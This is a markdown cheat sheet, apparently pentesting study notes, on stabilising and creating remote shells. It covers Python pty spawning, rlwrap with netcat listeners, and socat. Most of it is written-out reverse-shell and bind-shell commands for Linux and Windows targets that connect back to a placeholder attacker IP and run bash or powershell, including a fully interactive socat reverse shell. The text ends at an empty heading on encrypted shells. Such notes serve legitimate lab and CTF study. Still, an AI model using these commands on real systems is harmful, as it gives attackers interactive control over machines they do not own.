# Shell Stabilizing Techniques

### Technique 1: Python

**Step 1: uses Python to spawn a better featured bash. Some versions may used python2 or python3, change if necessary**
```JavaScript
python -c 'import pty;pty.spawn("/bin/bash")'
````

**Step 2: Gives us access to commands such as clear**
```JavaScript
export TERM=xterm
```

**Step 3:**

- Background the shell with CTRL + Z

- In your own terminal, use the command below. This will turn off your own terminal and foregrounds the shell 
```JavaScript
stty raw -echo; fg
```


### Technique 2: rlwrap

**Install rlwrap**
```JavaScript
sudo apt install rlwrap
```

**Usage**
```JavaScript
rlwrap nc -lvnp <port>
```
**Use the third step in technique 1 as the final step for Technique 2**


### Technique 3: Socat

* This tecnique is limited to linux machines
* You must also transfer the socat static compiled binary up to the target machine



## Socat Reverse Shells

**Basic Syntax: The following is equivalent to nc -nlvp <port>**
```JavaScript
socat TCP-L:<port> -
```
  
On Windows we would use this command to connect back
```JavaScript
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

This is the equivalent command for a Linux Target
```JavaScript
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```
  
  
## Socat Bind Shells

On a Linux target
```JavaScript
socat TCP-L:<PORT> EXEC:"bash -li"
```
  
On a Windows target
```JavaScript
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```
  
And from our attacking machine to connect to your listener...
```JavaScript
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```


## Fully Stabilized Socat Shell Listener
  
* We're connecting two points together
* We are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z, stty raw -echo; fg trick with a netcat shell -- with the added bonus of being immediately stable and hooking into a full tty

```JavaScript
socat TCP-L:<port> FILE:`tty`,raw,echo=0  
```
  
```JavaScript
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
  
The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  EXEC:"bash -li". We're also passing the arguments: pty, stderr, sigint, setsid and sane:

- pty, allocates a pseudoterminal on the target -- part of the stabilisation process
- stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
- sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
- setsid, creates the process in a new session
- sane, stabilises the terminal, attempting to "normalise" it.

  
## Socat Encrypted Shells
